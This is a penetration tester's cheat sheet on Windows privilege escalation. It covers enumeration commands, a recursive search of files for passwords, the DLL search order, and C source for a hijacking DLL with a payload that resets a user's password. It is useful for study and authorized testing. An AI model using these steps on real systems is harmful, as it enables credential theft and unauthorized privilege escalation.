# Windows

## Scripts

- WinPEAS -> [Link](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- PowerUp -> [Link](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- Windows Exploit Suggester -> [Link](https://github.com/bitsadmin/wesng)

## User enumeration

```console
Current user privileges:
$ whoami /priv

List users:
$ net users

List details of a user:
$ net user <username>

Other logged in Users:
$ qwinsta

User group on system:
$ net localgroup

List memers of a specific group:
$ net localgroup <groupname>
```

## System information

```console
$ systeminfo
$ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

$ hostname
```

## Searching files

```console
$ findstr /si password *.txt
findstr: Searches for patterns of text in files.
/si: Searches the current directory and all subdirectories (s), ignores upper case / lower case differences (i)
password: The command will search for the string “password” in files
*.txt: The search will cover files that have a .txt extension
```

## Vulnerable Software

```console
$ wmic qfe get Caption,Description,HotFixID,InstalledOn
$ wmic service get name,displayname,pathname,startmode
$ wmic product get name,version,vendor
$ wmic service list brief | findstr  "Running"
```
Check for Vulns :
- Searchsploit
- Metasploit
- Exploit-DB
- Github
- Google

## Network connections

```console
C:\Users\user\Desktop>netstat -ano
-a: Displays all active connections and listening ports on the target system.
-n: Prevents name resolution. IP Addresses and ports are displayed with numbers instead of attempting to resolves names using DNS.
-o: Displays the process ID using each listed connection.

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       68
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1092
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1348
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1636
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2288
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2468
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       780
  TCP    0.0.0.0:49681          0.0.0.0:0              LISTENING       788
```

Any port listed as “LISTENING” that was not discovered with the external port scan can present a potential local service.

## Sheduled tasks

```console
$ schtasks /query /fo LIST /v
```

## DLL hijacking

Windows follow one og these concepts:
- SafeDllSearchMode enabled:
  - The directory from which the application loaded.
  - The system directory. Use the GetSystemDirectory function to get the path of this directory.
  - The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
  - The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.
  - The current directory.
  - The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.

- SafeDllSearchMode is disabled
  - The directory from which the application loaded.
  - The current directory.
  - The system directory. Use the GetSystemDirectory function to get the path of this directory.
  - The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
  - The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.
  - The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key.     The App Paths key is not used when computing the DLL search path.

Finding Vulnerarbilities with `ProcMon` or any script like winPEAS
ProcMon needs admin privileges

Creating the malicious DLL file with Payload:

```
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;

    Payload for changing PW:
    "cmd.exe /k net user jack Password11"
}
```
use minqw compiler to generate dll file:
```
$ apt install gcc-mingw-w64-x86-64
$ x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll

start and restart the llsvc
$ sc stop dllsvc & sc start dllsvc
```

## Unquoted Service Path




